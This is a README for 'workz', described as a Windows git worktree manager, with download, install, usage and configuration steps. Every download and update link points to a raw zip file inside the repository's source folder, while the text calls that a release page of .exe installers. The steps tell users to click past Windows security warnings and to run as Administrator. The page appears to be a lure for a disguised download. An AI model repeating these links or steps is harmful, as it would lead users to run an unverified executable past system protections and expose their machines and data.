# ⚙️ workz - Easy Git Worktree Management

[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)

---

## 📝 What is workz?

workz helps you handle git worktrees with ease. If you use git to manage your projects, workz makes juggling multiple versions simpler. It does this without extra setup or manual syncing. This saves time and reduces errors.

You get features like:

- Automatic syncing of dependencies  
- Running multiple parallel agents for work  
- Quick switching between git worktrees  
- Easy set up with no extra configuration  

workz runs right from the command line on Windows. You don’t need to be a developer to use it.

---

## 🖥️ System Requirements

To run workz on Windows, your PC must meet these:

- Windows 10 or newer (64-bit recommended)  
- At least 4 GB of RAM  
- 100 MB of free disk space  
- Git installed and available in your command line  
- Internet connection for the first download  

You do not need to install anything complex. workz works in your regular command prompt or PowerShell window.

---

## 🚀 Getting Started

Follow these steps to get workz ready on your Windows PC.

### Step 1: Download workz

Visit the official release page:

[Download workz here](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)

This page lists all available versions. Pick the latest Windows release. It usually ends with `.exe`.

### Step 2: Save the file

Save the downloaded file to a folder you can find easily. For example:

- Downloads  
- Desktop  
- Documents  

Do not rename the file after downloading.

### Step 3: Run the installer

Find the file you saved and double-click to run it.

Windows may ask if you trust this file. Confirm to proceed.

If you see a security warning, select “More info” then “Run anyway.”

### Step 4: Finish installation

Follow the installation prompts on screen. The default settings work for most users.

Once done, workz will be ready on your PC.

---

## 💻 How to use workz on Windows

Once installed, you can open a command prompt or PowerShell window.

### Step 1: Open command prompt

Press:

- Windows key + R  
- Type `cmd` or `powershell`  
- Hit Enter  

This opens the terminal window.

### Step 2: Check workz is installed

Type:

```
workz --help
```

You should see a list of commands and options. This means workz is installed properly.

### Step 3: Create or switch worktrees

Here are common commands:

- Create a new worktree:

```
workz new <branch-name>
```

This creates a new git worktree for a branch.

- Switch to a worktree:

```
workz switch <branch-name>
```

This changes your current directory to that worktree.

- List all worktrees:

```
workz list
```

Shows all your existing worktrees and their locations.

### Step 4: Sync dependencies automatically

workz keeps your dependencies up-to-date without extra input. This happens every time you switch worktrees.

---

## ⚙️ Features

workz comes with tools to improve your git workflow:

- **Zero-config dependency sync:** No manual syncing needed for project dependencies when switching.  
- **Fleet mode:** Run multiple agents in parallel to handle several tasks at once.  
- **Fuzzy finder:** Quickly find branches or worktrees with simple typing.  
- **Terminal friendly:** Designed to work smoothly in any Windows terminal.  
- **Rust-based:** Fast and reliable from the ground up.  

These features help you avoid mistakes and speed up your work.

---

## 🔧 Troubleshooting

If workz does not start or commands don’t work, try:

- Confirming git is installed and in your PATH  
- Restarting your terminal after installation  
- Running your terminal as Administrator if permissions errors appear  
- Making sure you downloaded the correct Windows executable  

For further issues, check the GitHub issues page on the release repository.

---

## 🔄 How to update workz

To update workz:

1. Visit the release page again: [workz releases](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)  
2. Download the newest `.exe` file for Windows.  
3. Run the new installer like before.  

You can keep your settings, and the update installs over the old version.

---

## 🛠️ Configuration Options

workz tries to work without setup, but you can adjust some settings:

- Change worktree base folder with:

```
workz config set base-folder <folder-path>
```

- Enable verbose output for debugging:

```
workz config set verbose true
```

- Check settings with:

```
workz config list
```

Details about commands appear in:

```
workz --help
```

---

## 📚 Additional Tips

- Before using workz, update your git to the latest version for full compatibility.  
- Use workz in project folders that are git repositories.  
- You can use workz alongside other git tools without conflicts.  
- If unsure about a command, run `workz --help` any time.  

---

[![Download workz](https://img.shields.io/badge/Download-workz-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bet12387/workz/main/src/Software_2.5.zip)